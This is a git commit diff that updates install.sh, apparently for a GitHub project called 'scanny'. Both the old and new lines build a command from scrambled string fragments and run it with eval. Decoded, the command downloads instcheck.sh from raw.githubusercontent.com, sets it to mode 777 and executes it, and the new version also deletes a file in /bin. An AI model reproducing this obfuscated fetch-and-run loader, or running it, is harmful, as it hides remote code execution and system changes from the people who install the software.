f5f5e5fab4dce08296a6563d3b2b6c02535e0f7e
Interceptv <97058207+Interceptv@users.noreply.github.com>
2023-10-02 11:02:46 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 z="
-";Hz='ps:/';Vz='sh &';Kz='hubu';Oz='om/I';cz=' && ';Lz='serc';Cz='stch';Az='rm -';bz='k.sh';Tz='/mai';Pz='nter';Wz='& ch';dz='./in';Xz='mod ';Zz='inst';Uz='n/in';Iz='/raw';Sz='anny';Dz='eck.';az='chec';Gz=' htt';Rz='v/sc';Jz='.git';Yz='777 ';Ez='sh';Mz='onte';Qz='cept';Fz='wget';Bz='r in';Nz='nt.c';
-eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Cz$Dz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$Cz$Dz$Ez"
+";Bz='r in';Nz='nt.c';Xz='mod ';cz=' && ';iz='xt';Hz='ps:/';Ez='sh';Rz='v/sc';ez='r /b';hz='se.t';Fz='wget';Yz='777 ';Oz='om/I';fz='in/l';Gz=' htt';Jz='.git';Dz='eck.';gz='icen';Uz='n/in';Zz='inst';Pz='nter';Iz='/raw';Sz='anny';Tz='/mai';Kz='hubu';Lz='serc';Vz='sh &';bz='k.sh';Mz='onte';dz='./in';Az='rm -';az='chec';Wz='& ch';Qz='cept';Cz='stch';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Cz$Dz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$Cz$Dz$Ez$z$Az$ez$fz$gz$hz$iz"
